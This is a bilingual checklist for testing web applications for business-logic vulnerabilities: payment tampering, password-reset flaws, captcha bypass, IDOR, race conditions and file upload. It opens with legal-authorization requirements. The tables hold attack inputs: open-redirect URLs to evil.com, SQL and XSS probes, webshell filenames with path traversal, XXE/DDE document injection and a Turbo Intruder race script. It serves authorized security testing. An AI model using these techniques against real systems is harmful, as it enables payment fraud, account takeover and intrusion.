# Business Logic Vulnerability Checklist / 业务逻辑漏洞检查清单

> Companion to [SKILL.md](./SKILL.md), [SCENARIOS.md](./SCENARIOS.md), [METHODOLOGY.md](./METHODOLOGY.md). Distilled from instructor-led classes and the original `逻辑漏洞checklist.pdf` curriculum, every entry below has a **why** (root cause) and a **verify** (how to reproduce).

每条 checklist 都按 `Item | why | verify` 三栏组织。`why` 是漏洞的本质成因；`verify` 是给另一名工程师能 1:1 复现的最小步骤。

---

## 0. Compliance / 合规前置（每个项目第一条 checklist）

| Item | why | verify |
|---|---|---|
| 已获得书面授权且授权范围、时间窗口、数据可触及类型清晰 | 网安法第 22 条 / 刑法 285 条要求一切测试在授权范围内 | 检查授权书；目标系统清单；数据采集日志保存路径 |
| 测试工具非"专为入侵或非法控制设计" | 刑法 285 条修正案禁止提供专门入侵工具 | 工具来源（github / vendor）、用途说明、是否被列为恶意软件 |
| 测试中不接触/不存储/不传输任何真实公民个人信息 | 网安法第 38 条严禁非法获取或提供个人信息 | 实名/身份证类测试**只能用授权方提供的测试身份**；导出文件需脱敏 |
| 触发整数溢出 / 资源耗尽 / 大并发类漏洞前已二次确认 | 容易导致服务停摆，可能升级为破坏计算机信息系统罪 | 二次书面确认 + 留出业务低峰期窗口 |

参考：8.逻辑漏洞.pdf page_00001 / page_00002。

---

## 1. Login / 登录模块

| Item | why | verify |
|---|---|---|
| 登录接口对连续失败有限频或封禁 | 否则可枚举/撞库 | 用 Burp Intruder 连续提交 5~10 次错误密码，看是否触发图形验证码、IP 封禁、账户锁定 |
| 验证码有时效（≤ 5 min）且一次性 | 否则可暴力破解或重放 | 取得验证码后等待超时再提交；或同一验证码连续提交多次看是否仍被接受 |
| 验证码不可在响应中明文回传 | 8.逻辑漏洞.pdf page_00020 案例：JSON `{"randm":9759,"code":0}` 直接给出 | 抓包搜索响应体里是否含 `code`/`randm`/`captcha` 等字段值与短信内容一致 |
| 不允许"万能验证码" | 开发遗留的 `000000`/`123456` 容易被利用 | 用常见万能码尝试登录或重置流程 |
| 登录后 Session ID 必须重新签发 | 否则可能 session fixation | 登录前后对比 Cookie，看 SESSIONID 是否变化 |
| Cookie / Token 有 `HttpOnly`、`Secure` 标志且无可预测序列 | 弱 token 可枚举或伪造 | DevTools 查 Cookie 属性；分析 token 结构是否含明文 uid / role |
| 不允许空密码或被绕过的"短路"登录 | 校验缺失会任意登录 | 提交 `password=` 空值；提交 `username=admin'/*` 等 |
| 错误提示对"用户存在 / 不存在"统一模糊回复 | 否则可枚举用户 | 输入已知用户与随机用户，对比响应文案、状态码、耗时 |
| 第三方/SSO 登录回调严格校验授权码与用户 ID 绑定 | 回调接口仅信任传入 user_id 参数即接管 | 在第三方登录回调请求中将 `uid`/`openid` 参数改为受害者 ID，看是否登录至受害者账户 |
| 登录响应中的 `status`/`is_login`/`code` 状态位不可被前端改写后冒认登录态 | 后端未真正建立会话，前端依赖响应字段判断 | 拦截响应，把 `success:false` 改为 `true`、`is_login:0` 改为 `1`，看是否进入受保护页 |
| 生物识别接口必须含活体检测，不接受静态图片/预录视频 | 仅校验特征值未校验活体属性，可媒体替换 | 用合法用户的静态人脸照片/录屏文件替代摄像头流提交，看是否判定为活体 |
| 硬件密钥/USB-Key 签名带时效与一次性 nonce | 否则旧签名可重放，伪造密钥可重用 | 拦截一次合法签名请求，重放旧签名或修改 device-id 字段，看服务端是否拒绝 |
| 登录/注册的 `return_url`/`redirect`/`callback` 走域名白名单 | 否则任意外站钓鱼 | 改 `return_url=https://evil.com` 看响应 Location 是否指向外部 |

参考：逻辑漏洞checklist.pdf page_00003、8.逻辑漏洞.pdf page_00019/00020。

---

## 2. Registration / 注册模块

| Item | why | verify |
|---|---|---|
| 后端独立校验图形验证码 / 短信验证码，前端校验只是 UX | 跳过前端就相当于跳过验证 | Burp 拦截注册请求，删除 `verifycode` 参数后 replay |
| 短信验证码与手机号强绑定 | 不绑定可发到 A 用 B 的码注册 | 抓包改 `mobile=A` 但 `code=B 的码` 看能否成功 |
| 一个邮箱/手机号不能重复注册 | 缺乏唯一性会导致养号、撞库 | 用相同邮箱 + 不同 username 多次注册；并发同邮箱注册 |
| 注册接口防爆破（频率 + 图形验证 + 设备指纹） | 用于批量小号 | 用脚本每秒提交不同 username，看是否成功 |
| 验证码 / 注册 token 不在响应里回传 | 回传可绕过验证 | 抓包看响应里是否直接返回 `randm`/`activation_token` |
| 公众号 / 小程序 / 内部接口同样有验证码 | "只有公众号才管的入口"是高风险点 | 试访问 H5 页未暴露但 App 内有的接口（逻辑漏洞checklist.pdf page_00004） |
| 用户名/昵称字段做 XSS 过滤 | 注册时插 XSS 是经典存储型 | 注册时填 `<script>alert(1)</script>`，登录后查个人主页 |
| 不允许 token / timestamp 重放绕过防重 | 否则可批量重复注册 | 同一注册请求改时间戳后 replay |
| 注销账号后立即用相同用户名/邮箱重新注册不应继承旧权益、订单、余额、VIP | 注销流程未彻底清除关联数据/会话 | 注销账号 → 立即用同账号重新注册并登录，检查订单 / 余额 / VIP 状态 |
| 风控规则覆盖"多个相似虚拟账户批量下单"场景 | 风控只盯单账号或单一特征即被多账户绕过 | 注册 N 个不同邮箱但同设备/同 IP 的账号，并发执行薅羊毛动作看是否拦截 |
| 注册多步流程后端校验前置步骤实际完成 | 否则攻击者可直接 POST 最后一步绕过邮箱/手机验证 | 跑完一次正常注册抓所有请求，下次直接发"设置密码"那一步看是否成功 |

参考：逻辑漏洞checklist.pdf page_00004。

---

## 3. Password Recovery / 找回密码

| Item | why | verify |
|---|---|---|
| 重置 token 不可基于弱随机数 | `Windows rand()` max=32768 可枚举 | 看后端 token 生成是否 `md5(rand())`；本地 0~32768 全量字典爆破对照（逻辑漏洞checklist.pdf page_00011） |
| 重置 token 一次性 + 短时效 | 否则可重放 | 重置成功后再用同一 token 改另一个密码看是否仍接受 |
| 重置流程中"目标用户"由服务端 session 决定，不接受请求体替换 | 否则可改 user_id 重置他人密码 | 自己发起重置走到第 4 步时，把请求体里的 `user_id` 或 `email` 改成受害者，看能否成功 |
| 验证码与提交手机号强绑定 | 不绑定就可"用自己手机收码、改受害者手机号"完成重置 | 抓包改 `phone=victim`、`code=自己收的码` 看能否通过 |
| 改邮箱后旧重置 token 立即失效 | 否则可"先索 token → 改邮箱 → 用旧 token 接管" | 索一个 token，立即改邮箱再用旧 token，看是否还有效 |
| 修改后的链接绑定到当前会话/设备 | 否则可跨设备劫持重置 | 在桌面浏览器索 token，移动浏览器使用，看是否还能完成 |
| 找回流程内每一步都强校验"上一步是否真的通过"（状态机） | 否则可跳过验证步直接到改密 | 直接 POST 改密接口，不带验证步骤的标志位 |
| 短信验证码不能写在 Cookie / 响应包 | 8.逻辑漏洞.pdf page_00020 类问题 | 抓包搜索响应体 `"randm"`、`"verify_code"` |
| 重置 token 不可仅经 Base64 等可逆编码"假装加密" | 简单 decode 即得明文验证码 | 抓密码重置响应包，对疑似字段做 base64/url decode，得到明文则可直接重置 |
| 跨步骤令牌不可复用：邮箱验证 token 不能塞回手机验证步骤 | 后端只校验 token 合法不绑定步骤 | 步骤 A 拿到 reset_token，跳过 B/C，直接在 D（设新密码）传该 token 看是否成功 |
| 找回密码全流程数据包应做差异分析挖断点 | 不同用户/不同步骤的请求差异常暴露 token 生成规律 / 缺失校验字段 | 用 Burp Comparer 对比多次重置请求的 URL、POST 体，找时间戳 / UID / token 是否可预测 |
| 发现 reset_token / 验证码出现在 URL / HTML 源码 / JS 字符串里需高危处理 | 直接暴露在前端等于绕过认证 | grep 页面源码与 JS 文件搜 `token`、`code`、`answer`、`reset_id` 关键词 |

参考：逻辑漏洞checklist.pdf page_00004/00005/00011。

---

## 4. Captcha / 验证码模块

| Item | why | verify |
|---|---|---|
| 接口对 IP / 手机号 / 设备做单位时间频率限制 | 否则被短信轰炸 | 用 Burp Repeater 连发 100 次同一手机号请求，看是否仍每条都发 |
| 高并发下不能绕过频率限制 | 简单计数器有竞态 | 用 Burp Turbo Intruder `concurrentConnections=30` 同时发，看是否突破限频（8.逻辑漏洞.pdf page_00016） |
| 不依赖 Cookie / JSESSIONID 来记"已发送" | 删 cookie 即重置 | 抓包删 Cookie 后 replay 看是否能再次成功 |
| 手机号字段严格 trim + 长度校验 | `13888888888 ` (尾部空格)、`+86`、`/r/n` 等可绕过 | 提交 `phone=13888888888 `、`phone=8613888888888`、`phone=13888888888\r\n` 测试 |
| 拒绝超长手机号被网关自动截断 | `138888888889` 12 位被截前 11 位仍发出 | 抓包提交 12 位号码，看是否仍下发短信 |
| 验证码不可在响应里 echo | 8.逻辑漏洞.pdf page_00020 | 搜索响应体里是否包含与短信一致的数字 |
| 同一验证码不可多次使用 | 否则可重放 | 输入正确码，重复 submit N 次看是否成功 |
| 长度足够（建议 6 位+）防爆破 | 4 位纯数字 5 分钟可爆破完 | 用 Burp Intruder 0000~9999 全量爆破计算耗时 |
| 不存在"万能码"残留 | 8.逻辑漏洞.pdf page_00008 | 尝试 `000000`、`123456`、`888888`、`111111` |
| 删除 captcha 参数仍被拒绝 | 后端需强校验参数存在 | Burp 删除 `captcha=` 参数后 replay |
| 验证码与当前会话/账号上下文绑定，不接受跨账户复用 | 仅校验数值正确不绑会话即可借用 | 在 A 账户索取验证码，在 B 账户的下一步流程里填入 A 的码看是否通过 |
| 验证码使用一次后立即作废，不允许"用完未销毁仍可重放" | 一次性属性缺失即可重放完成多次操作 | 一次成功验证后再次提交相同验证码看是否仍接受 |
| 接收手机/邮箱参数不可被请求体改写为攻击者控制的地址 | 发送验证码接口未校验请求来源与接收者一致性 | 拦截"发送验证码"请求，把 `phone` / `email` 改为攻击者地址，发送后看是否在攻击者侧收到验证码 |

参考：8.逻辑漏洞.pdf page_00014~00023、逻辑漏洞checklist.pdf page_00007/00008/00009。

---

## 5. Payment / 支付与充值

| Item | why | verify |
|---|---|---|
| 服务端独立校验金额（不信任前端 `amount`/`total_price`） | 经典前端可控参数 | 抓包改 `amount=0.01`/`amount=-100`，看订单是否生效 |
| 支付状态由后端根据网关回调写，不接受客户端 `payment_status=paid` | 8.逻辑漏洞.pdf page_00005 | 改 `payment_status=paid`、`is_paid=1` 看订单是否被标记完成 |
| 数量字段必须为正整数 | `quantity:-1` / `quantity:0.02` 都构成漏洞 | `skuQty:0.02` (8.逻辑漏洞.pdf page_00011)、`FoodNum:0.01` (page_00012) |
| 数量字段做上限校验防整数溢出 | int32 max+1 = -2147483648 | 提交 `quantity=2147483648` 看是否回绕（8.逻辑漏洞.pdf page_00008） |
| 优惠券面值不能为负数或大于商品价 | `coupon_amount=-100` 反加；`coupon_amount > price` 直接 0 元 | 抓包修改 coupon 字段（8.逻辑漏洞.pdf page_00006） |
| 即使前端报"支付失败"，订单详情里 amount 必须等于商品价 | 订单可能已生成，再用站内钱包补支付 | 改券后看订单详情，尝试用钱包支付（8.逻辑漏洞.pdf page_00006） |
| 支付接口名 / 渠道走白名单校验 | 否则替换不存在接口可"成功" | 改 `payment_method=invalid_chan` 看响应（8.逻辑漏洞.pdf page_00007 0x05） |
| 试用接口与购买接口完全隔离 | 否则"试用 URL 改成购买"刷免费 VIP | 把 URL 末尾的 `4` (试用) 改 `3` (购买) 看是否仍归 0 元（8.逻辑漏洞.pdf page_00008 0x11） |
| 收款人 `username`/`account_id` 由服务端 session 决定 | 否则可替换为受害者扣他钱 | 改 `username=victim` 看是否扣他人余额（8.逻辑漏洞.pdf page_00008 0x10） |
| 充值金额精度不被四舍五入吃掉 | 0.019 元只扣 0.01 但钱包加 0.02 | 充 0.019 看实际扣款与钱包变化（8.逻辑漏洞.pdf page_00013） |
| 服务端用整数（分）而非浮点 | 浮点四舍五入是精度漏洞根源 | 看响应里金额是 `1.99`/`199` |
| 支付回调签名 + 时间戳 + 来源 IP 三重校验 | 否则可伪造成功通知 | 抓真实回调，本地伪造重发 |
| 回调接口幂等 | 否则重放可重复发货 | 同一回调请求重放 N 次，看订单状态变化 / 是否多次发货 |
| 支付完成后购物车锁定 | 否则可"支付完再加车，按新车发货" | 在支付页停留时返回另开标签加车，完成支付看实际发货 |
| 用户/订单替换攻击防护 | 多笔订单的支付通知应严格绑定 transaction_id | 同时下大额订单 + 小额订单，用小额支付通知去 confirm 大额 |
| 多设备并发签约不获新人优惠 | 服务端必须 lock 用户状态 | 多手机同时进新人优惠支付页，依次完成（逻辑漏洞checklist.pdf page_00012） |
| 限时活动用服务端时间，不信前端 timestamp | 否则改 time 绕过 | 改请求里 `time` 参数为活动外时间（逻辑漏洞checklist.pdf page_00013） |
| 关键字段服务端有签名 / HMAC，签名覆盖**所有**影响金额参数 | 否则未签名间接字段（数量、折扣）改了仍生效 | 对比正常 vs 篡改请求，找未签名字段（逻辑漏洞checklist.pdf page_00017） |
| 移动端不硬编码 RSA 私钥 / MD5 密钥 | 反编译可拿，伪造签名 | jadx 反编译 APK，搜 `md5`、`RSA`、`SecretKey` 字符串 |
| 货币代码 `currency` 与金额联动校验，不接受切换至低汇率币种 | 后端不重新换算汇率，直接按数字扣款 | 同一支付请求把 `currency=CNY` 改 `currency=JPY/RUB/INR`，保持 amount 数值不变看实际扣款金额 |
| 运费/手续费/优惠等"非商品金额"字段必须正数校验 | `shipping_fee=-500` 直接抹掉应付金额 | 拦截下单请求把运费 / 手续费 / 折扣字段改为负数，看订单总额是否被冲减 |
| 订单生成后的"编辑/换货/补差价"接口必须重新查询商品现价 | 否则可创建普通订单后改 SKU 为低价商品支付 | 生成订单 → 调编辑接口把商品 ID 改为低价商品 → 完成支付看实际扣款 |
| 退款 / 取消订单后所有虚拟权益（积分、VIP、服务、优惠券复用权）必须同步回收 | 业务闭环缺失，退款后已发放的权益不撤销 | 跑"购买 → 使用 → 退款"三步，检查积分余额、VIP 等级、优惠券状态是否复原 |
| 收款人 / 商家 / 提现账户字段由服务端 session 判定，不接受请求体替换 | 攻击者可改 receiver_account 把资金转入自己账户 | 拦截提现 / 转账请求改 `receiver_account` / `merchant_id` 字段，看资金去向 |
| 一次成功支付仅能触发一次发货 / 一次充值入账 | 缺幂等性的"模拟支付成功回调"可白嫖 N 次 | 抓真实支付成功的回调或确认请求，用 Burp Repeater 高频重放，看库存/余额是否多次变化 |
| 系统对"利润 0.001 元，但日调用 100 万次"类微利薅羊毛有总量风控 | 单次差额小但累积巨大 | 估算单次利差 + 接口频率 + 每日上限，做累积可获利测算 |

参考：8.逻辑漏洞.pdf page_00004 ~ 00013、逻辑漏洞checklist.pdf page_00002/00012/00013/00017/00018。

---

## 6. Coupons / Points / Gift Cards / 优惠券、积分、礼品卡

| Item | why | verify |
|---|---|---|
| 单券一次性 + 状态绑定订单 | 否则订单关闭后券仍在，重复使用 | 创建订单 → 关闭 → 重新下单看券是否仍可用（逻辑漏洞checklist.pdf page_00013） |
| 同一券不能并发应用到多个订单 | 竞态打 | Burp Repeater Group "Send in parallel" 提交 20 次相同 coupon 应用 |
| 券值范围严格校验 | 防 `value=-100`、`value=999999` | 抓包改面值 |
| 数组形式提交多张券会被拒 | `couponid[0]=A&couponid[1]=B` 是常见绕过 | 把请求改成数组形式（参见 SCENARIOS.md §6.1） |
| 积分抵扣值有上限且 ≥0 | 否则可负数反加积分 | 改 `points=-1000` |
| 邀请码不形成自循环 / 无限链 | 用 throwaway email 创号 → 互邀 → 无限返佣 | 创账号 A、B、C 互相填邀请码，看返佣是否到账 |
| 礼品卡 / 兑换码并发兑换被拒绝 | 双花经典场景 | Burp 并行重放兑换请求 |
| 抽奖次数 / 概率不可被前端控制 | 8.逻辑漏洞.pdf page_00009 类 | 抓包改 `chance_count`、`prize_id` |

参考：逻辑漏洞checklist.pdf page_00006/00013、SKILL.md §4。

---

## 7. Order / 订单与购物车

| Item | why | verify |
|---|---|---|
| 总金额服务端用单价×数量重算，不信任前端 `total` | 否则改 total 实付任意 | 抓包修改 `total_amount`，看实际扣款 |
| 数量为负 / 0 / 浮点都被拒绝 | 8.逻辑漏洞.pdf page_00011 / 00012 | `quantity=-1`、`quantity=0`、`quantity=0.02` |
| 库存为 0 / 接近 0 时正确并发处理 | 防超卖 | 多线程同时购买仅剩 1 件商品 |
| 订单状态机仅允许合法跳转 | 否则可 PUT `status=paid`/`refunded`/`shipped` 直接跳 | 直接调状态变更 API（参考 SKILL.md §6） |
| 不允许从已发货 / 已完成订单回退到待支付 | 否则可"取消已发货订单刷退款" | 试图改 status 倒退 |
| 订单 ID 不可枚举（UUID 而非自增） | 否则遍历可看他人订单 | 递增 `order_id=1..N` 看是否能拿别人订单数据 |
| 订单详情接口独立做归属校验（不只在 ID 上做） | IDOR | 用 A token 访问 B 的订单 ID |
| 同一订单不能并发提交支付 | 否则可双花 | 并发提交相同 cart_id 看是否生成多笔扣款单笔到账 |
| 退货/退款不能跳过商家审核 | 8.逻辑漏洞.pdf page_00009 | 直接调 refund API 不走审核 |
| 收货确认绑定真实收货地址 / 用户确认 | 否则可绕过自动确认 | 直接调 confirm-receipt 接口 |

参考：8.逻辑漏洞.pdf page_00009、逻辑漏洞checklist.pdf page_00015/00016。

---

## 8. IDOR / Privilege Escalation / 越权访问

| Item | why | verify |
|---|---|---|
| 所有 API 都走 Filter / 中间件统一鉴权（不只前端隐藏入口） | Java Web 常见缺陷：仅 Servlet 跳页面没有 Filter，所有非登录页面均可未授权访问 | 删 Cookie 直接访问 `/api/*` 看是否还能拿数据 |
| 资源 ID 必须做归属校验，不只校验"已登录" | 经典水平越权：登录后接口拿 ID 不做归属判断 | 用 A 账号访问 B 的 user_id 资源 |
| 角色字段（role/level）不可在 cookie / 请求体中可修改 | base64 cookie `uid=admin1` | 改 cookie 中 uid / role 字段后 replay |
| RBAC 数据一致性：UI 删除权限后数据库 sys_menu 不残留重复行 | 后端业务逻辑常见缺陷：sys_menu 重复行致权限取消未真正生效 | 取消用户某权限后查 sys_menu 表是否仍有该记录 |
| Cookie 替换不能拿到管理员数据 | 抓 admin Cookie 给普通用户用即越权，是经典 cookie 替换攻击 | 用 admin 抓包，普通账号 replay 用 admin Cookie |
| `/admin/*` 路径 Filter 用 `request.getServletPath()` 而非 `getRequestURI()` | `getRequestURI` 不规范化路径，分号截断后判定失效 | 试 `/admin/;/login` 是否绕过 |
| 路径中 `..//` 不能截断 Filter | `/FilterDemo/../../index.jsp` 截断绕过登录检查的经典 Servlet 缺陷 | 提交 `/admin/../../home`、`/admin/..%2F..%2F` 看响应 |
| 后台 URL 不暴露 / 不可枚举 | 后台入口直接命中（如 `main.php`）即未授权访问 | 试常见路径 `admin.php`、`/admin`、`/manage` |
| Spring Security 配置 antMatchers 覆盖完全 | `.antMatchers("/system/menu/**").hasRole("admin")` 仅匹配前缀，漏写接口路径即未授权 | grep `@PreAuthorize`、`@RequestMapping`，对照配置 |
| 所有"管理员可见数据"接口检查请求来源用户角色 | 防垂直越权 | 用 user token 调 admin API |
| 第三方 / 内部接口必须鉴权 | `/api/internal/*` 漏出来即未授权 | nmap / dirsearch 探内部接口 |
| Host 碰撞下不暴露内部资产 | 8、2022 第 20 段：`host_scan.py` 碰撞出注入/上传/越权 | `python3 host_scan.py -d target.com -t 100` |
| 邮箱 / 手机更换接口必须先验证旧绑定凭证（旧密码 / 旧邮箱验证码 / 旧手机验证码） | 跳过原校验直接 `new_email=attacker` 即接管账号 | 拦截"更换邮箱/手机"请求，移除旧凭证字段或留空，看是否仍允许变更 |
| UID 与 session token 一致性校验：禁止 token 属于 A、请求体里 uid=B | 后端只看 uid 不看 token 归属即横向越权 | 保持 A 的 Cookie/Token 不变，把请求体里的 `uid` 改为 B，看是否返回 B 的数据 |
| 多端入口（Web、App、小程序、对外开放 API）权限策略一致 | Web 拦截 / App 不拦截 = 替代入口绕过 | 同一受限功能在不同端分别测试，比对权限校验是否一致 |
| 群组 / 社交管理操作（踢人、禁言、置顶）服务端校验"操作者身份与目标对象关系" | 否则可修改 target_uid 操作非本群成员或群主 | 拦截踢人请求把 `target_uid` 改为群主或非本群成员的 ID 看是否成功执行 |
| 升级/降级权益时新旧角色权限完整切换，无残留 RBAC 数据 | 角色更新逻辑只新增不删除即权限污染 | 用户从 admin 降为 user 后立即调用管理 API，看是否仍能调用 |
| 隐藏分享链接 ID / 礼物 ID / 活动 ID 必须随机化或带访问 ACL | 数字递增可遍历他人隐私行程或资源 | 拿到一个合法 ID，用 Intruder 数字递增枚举附近 ID 看是否能拿其他用户数据 |

参考：Java Web Filter / Spring Security 鉴权常见缺陷模式（详细可在 SCENARIOS.md 中扩展）。

---

## 9. Real-Name & Privacy / 实名认证、隐私合规

| Item | why | verify |
|---|---|---|
| 实名认证后认证状态锁定，不可"故意填错驳回再修改" | 8.逻辑漏洞.pdf page_00029：故意填错身份证 → 驳回 → 重置入口 | 用错误身份证提交认证，被驳回后看是否还能改身份信息 |
| 提交错误身份证 N 次自动锁定或人工审核 | 否则可重放绕过防沉迷 | 连续 5 次提交不同错误身份证看是否被风控 |
| 服务端响应不能信前端 success 字段 | 8.逻辑漏洞.pdf page_00022/00023：改 `success:true` 绕过密码校验换绑手机号 | Burp 改响应 `success:false → true` 看前端流程是否放行 |
| 修改手机号 / 邮箱前必须验证旧凭证（密码或旧手机验证码） | 漏校验直接接管 | 不带验证字段直接 POST 修改接口 |
| 个人资料字段不可越权修改他人 | 改 user_id 改别人资料 | 抓包改 `user_id=victim` 看是否成功 |
| 头像 / 文件上传严格类型校验 + 沙箱 | 防 webshell + XXE | 上传 `.php`/`.jsp`、上传含 `<!ENTITY>` 的 docx |
| 数据脱敏跨接口一致 | 8.逻辑漏洞.pdf 案例：A 显 `138****5678`，B 显 `1384***5678`，C 显 `13845**678`，组合可还原 | 列出所有泄露同一字段的接口对比掩码方式 |
| 敏感字段不在响应里全量返回 | 用户信息查询返回 password / id_card 全文 | 抓登录 / 个人中心查询响应，搜 `password`、`身份证` |
| 接口枚举有频率限制 + 行为分析 | 防身份证号爆破（8.逻辑漏洞.pdf page_00027 不同状态码 501/531 暴露有效性） | Burp 用递增身份证号枚举，看响应差异（length/code） |

参考：8.逻辑漏洞.pdf page_00022/00023/00027/00028/00029/00030。

---

## 10. VIP / Subscription / Resource Access / 付费内容

| Item | why | verify |
|---|---|---|
| 资源链接（视频/音频/课程文件）必须服务端鉴权，不能在响应里给直链 | 8.逻辑漏洞.pdf page_00031/00032/00033：抓包发现 `previewPullUrl: ...flv` 直链下载 VIP 资源 | 抓详情接口响应，搜 `.flv`、`.mp4`、`.m3u8`、`url`，复制到 VLC 或 flv.js demo 播放 |
| 替换免费课程 ID 为付费课程 ID 不可绕过付费校验 | IDOR 经典场景 | 抓免费课程接口，把 ID 替换为付费课程 ID 看是否同样返回内容 |
| 直链带短期签名 + Referer + IP 校验 | 单纯链接公开仍可被分享 | 复制链接到无 Referer 环境（curl）看是否能下载 |
| VIP 时长升级支持幂等防重 | 多端并发补差价升级被锁（逻辑漏洞checklist.pdf page_00012） | 多设备同时点"补差价升级"完成支付看 VIP 时长是否多倍叠加 |
| 试用 → 购买流程隔离 | 试用接口换接口号即获购买（8.逻辑漏洞.pdf page_00008） | URL 末尾 `/4` 改 `/3` 看是否仍按试用价 |
| 降级会员后高级 API 立即拒绝 | UI 隐藏≠后端拒绝 | 升级后调用高级接口 OK，降级后立即调用，看是否仍 200 |
| VIP 等级字段不可在请求体改 | `vip_level=99` 改 cookie 或请求体 | 抓包修改对应字段 |

参考：8.逻辑漏洞.pdf page_00031~00033、逻辑漏洞checklist.pdf page_00012。

---

## 11. URL Redirect / SSO / 第三方系统

| Item | why | verify |
|---|---|---|
| 跳转参数走白名单或仅 path | 否则任意 URL 跳转钓鱼 | `?url=https://evil.com` 看是否跳转 |
| 校验需覆盖编码绕过 | `?`、`@`、`/`、`#`、子域名、畸形 URL、IP 直连等多种手法（逻辑漏洞checklist.pdf page_00015） | 提交 `https://target.com@evil.com`、`https://target.com.evil.com`、`https://evil.com/?target.com`、`https://evil.com#target.com`、`https://[::1]/`、`https://0x7f000001/` |
| OAuth 回调地址绑定到客户端而非用户输入 | 否则任意回调可拿 token | 改 `redirect_uri=evil.com` 看是否颁发 |
| Webhook 回调签名 + 时间戳 + IP 白名单 | 否则可伪造支付/订阅事件 | 本地伪造回调直接 POST 给 `/webhook/*` |
| 第三方账户接口未授权 | 逻辑漏洞checklist.pdf page_00007 第三方系统未授权 | 删 cookie 访问 /third/api/* |
| 第三方应用版本无已知 CVE | 老版本组件 | wappalyzer / banner grab 看版本 |

参考：逻辑漏洞checklist.pdf page_00007/00014/00015。

---

## 12. Cookie / Token / Session

| Item | why | verify |
|---|---|---|
| Cookie 设 `HttpOnly`、`Secure`、`SameSite=Lax+` | 防 XSS 偷 cookie | DevTools 看 Cookie attributes |
| Token 不可预测 / 不可枚举（建议 ≥128 bit 随机） | 弱随机即可枚举 | 拿到多个 token，对比是否有规律（自增 / 时间戳 + 短盐） |
| Token 有合理过期时间 + 单设备 / 单端绑定 | 否则一次盗到永久控权 | 登录后 7 天再用同 token 试，或多端登录看是否互踢 |
| 改密码后所有旧 token 立即失效 | 否则改密无意义 | 在 A 设备登录，B 设备改密，看 A 是否被踢 |
| Cookie 不放业务关键状态字段 | 别把 `is_paid=1` 写 cookie | 抓 cookie 看是否含 `role`/`is_paid`/`vip` |
| 改 cookie 字段不能影响权限 | 8.逻辑漏洞.pdf page_00017 类问题 | 改 `JSESSIONID`、`uid` 后看响应变化 |
| 重置 cookie 不会重置服务端验证码计数 | 否则删 cookie 即解封 | 删 cookie 重新请求验证码看是否再次成功（8.逻辑漏洞.pdf page_00017） |
| Token 不可由客户端可控信息（用户名 + 时间戳）通过弱算法生成 | `md5(username+timestamp)` 这类是经典伪造点 | 抓多个不同账户/时间的 token，本地用同算法生成，替换后访问受保护资源看是否成功 |
| 退出登录 / 修改密码 / 更换绑定后旧 token 在 5 秒内全局失效 | 否则失效凭证仍可调敏感接口 | 旧设备发起请求 → 新设备退出 → 旧设备再次发起，看是否被拒绝 |
| 一次性 token / nonce / CSRF token 在第一次成功使用后立即作废 | 没作废即可重放敏感操作 | 抓含一次性 token 的请求一次性提交两次看第二次是否被拒 |
| Token 跨设备 / 跨 IP 使用时触发风控（异常登录提醒或强制重新认证） | 没绑定上下文即偷到 token 全球可用 | 用 A 设备登录拿到 Token，B 设备/不同 IP/不同 UA 用同 token 调敏感接口看是否拒绝 |

参考：逻辑漏洞checklist.pdf page_00011、SCENARIOS.md §5.3。

---

## 13. Race Condition / 并发竞态（横向 cross-cut）

> 凡是上面 checklist 出现"单次成功"的攻击，都要再问一遍：**并发是否能突破？**

| 场景 | 测试方式 |
|------|--------|
| 优惠券一次性 | Repeater Group `Send in parallel` 同时应用 20 次 |
| 礼品卡余额扣减 | Turbo Intruder concurrentConnections=30 |
| 限购"每人一份" | 多账号 / 多 IP 同时领 |
| 限频短信验证码 | 8.逻辑漏洞.pdf page_00016 案例：concurrentConnections=30, requestsPerConnection=10 |
| 多端并发会员升级 | 逻辑漏洞checklist.pdf page_00012 |
| 同邮箱并发注册 | 期望"唯一性约束生效"，否则双账号 |
| 同 cart 并发结账 | 双花 |

参考脚本：

```python
# Burp Turbo Intruder template
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=10,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')
    engine.openGate('race1')
```

---

## 14. Comment / Third-Party Inputs / 评论与外部输入

| Item | why | verify |
|---|---|---|
| 评论字段做参数化 SQL + XSS 过滤 | POST/Cookie 注入 + 评论 XSS | 提交 `'`、`<script>` |
| 评论需 token / session 校验防 CSRF | 否则可伪造评论 | 删除 referer / token 后提交 |
| 不可遍历评论用户 ID 拿用户信息 | IDOR | 改 `userid=N` 看是否泄露 |
| 评论速率限制 + 风控 | 防刷评 | 高频提交看是否拦截 |

参考：逻辑漏洞checklist.pdf page_00007。

---

## 16. File Upload / 文件上传业务逻辑

> 仅针对"上传业务"自身的逻辑校验。Webshell / 解析漏洞 / 敏感文件读取等通用利用链请同时加载 `upload-insecure-files/SKILL.md`。

| Item | why | verify |
|---|---|---|
| 上传文件以"文件签名/魔术字"为准，不依赖 `Content-Type` 与扩展名 | 仅检查 MIME / 扩展名可被改包绕过 | 拦截上传请求，把 `Content-Type` 改 `image/jpeg`，body 是 PHP 内容，看是否上传成功且能解析执行 |
| 扩展名校验拒绝双扩展、大小写混合、点号截断、`;` 截断、空字节 | `.php.jpg`、`.Php`、`.php.`、`.php;.jpg`、`.php\x00.jpg` 均常见绕过 | 用 `shell.php.jpg` / `shell.Php` / `shell.php%00.jpg` / `shell.php;a=1` 各跑一发 |
| 文件名做规范化，禁止 `..` / 绝对路径 / 控制字符 | `filename=../../webshell.php` 写到根目录 | 拦截上传请求把 `filename` 改 `../../webshell.php` 看落地路径 |
| 上传文件落地路径不可被前端字段控制 | 否则直接覆盖任意路径文件 | 抓包看请求是否含 `path` / `dir` / `category` 字段，尝试改为业务外路径 |
| 上传文件存储路径不可枚举或跨用户覆盖 | `/uploads/UID/filename` 知道 UID 即可命中 | 用 A 上传 `a.png`，用 B 用相同文件名上传，看是否覆盖 A 或写入 A 路径 |
| 服务端解析 / 转换图片走沙箱并控版本 | ImageMagick / FFmpeg / Pillow 都有 RCE 历史 | 上传含恶意 EXIF / payload 的 JPG 触发已知 CVE，看服务端反应 |
| Office / OOXML / PDF 上传必须重打包检测：xml 合法性 + 危险节点（DDE、宏、外部链接）剥离 | docx 实质 ZIP，重打包注入恶意 XML 即绕过表面校验 | 解压 `.docx` 改 `[Content_Types].xml` 注入外部实体 / DDE 后重打包上传 |
